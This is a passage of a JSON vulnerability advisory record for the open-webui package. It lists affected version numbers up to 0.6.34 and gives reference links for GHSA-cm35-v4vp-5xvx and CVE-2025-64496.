        "0.3.33.dev1",
        "0.3.34",
        "0.3.35",
        "0.3.4",
        "0.3.5",
        "0.3.6",
        "0.3.7",
        "0.3.8",
        "0.3.9",
        "0.4.0",
        "0.4.0.dev1",
        "0.4.0.dev2",
        "0.4.1",
        "0.4.2",
        "0.4.3",
        "0.4.4",
        "0.4.5",
        "0.4.6",
        "0.4.6.dev1",
        "0.4.7",
        "0.4.8",
        "0.5.0",
        "0.5.0.dev1",
        "0.5.0.dev2",
        "0.5.1",
        "0.5.10",
        "0.5.11",
        "0.5.12",
        "0.5.13",
        "0.5.14",
        "0.5.15",
        "0.5.16",
        "0.5.17",
        "0.5.18",
        "0.5.19",
        "0.5.2",
        "0.5.20",
        "0.5.3",
        "0.5.3.dev1",
        "0.5.4",
        "0.5.5",
        "0.5.6",
        "0.5.7",
        "0.5.8",
        "0.5.9",
        "0.6.0",
        "0.6.1",
        "0.6.10",
        "0.6.11",
        "0.6.12",
        "0.6.13",
        "0.6.14",
        "0.6.15",
        "0.6.16",
        "0.6.18",
        "0.6.19",
        "0.6.2",
        "0.6.20",
        "0.6.21",
        "0.6.22",
        "0.6.23",
        "0.6.24",
        "0.6.25",
        "0.6.26",
        "0.6.26.dev1",
        "0.6.27",
        "0.6.28",
        "0.6.29",
        "0.6.3",
        "0.6.30",
        "0.6.31",
        "0.6.32",
        "0.6.33",
        "0.6.34",
        "0.6.4",
        "0.6.5",
        "0.6.6",
        "0.6.6.dev1",
        "0.6.7",
        "0.6.8",
        "0.6.9"
      ],
      "database_specific": {
        "last_known_affected_version_range": "\u003c= 0.6.34",
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-cm35-v4vp-5xvx/GHSA-cm35-v4vp-5xvx.json"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/open-webui/open-webui/security/advisories/GHSA-cm35-v4vp-5xvx"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-64496"
    },
    {
      "type": "WEB",
      "url": "https://github.com/open-webui/open-webui/commit/8af6a4cf21b756a66cd58378a01c60f74c39b7ca"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/open-webui/open-webui"
    }
  ]
}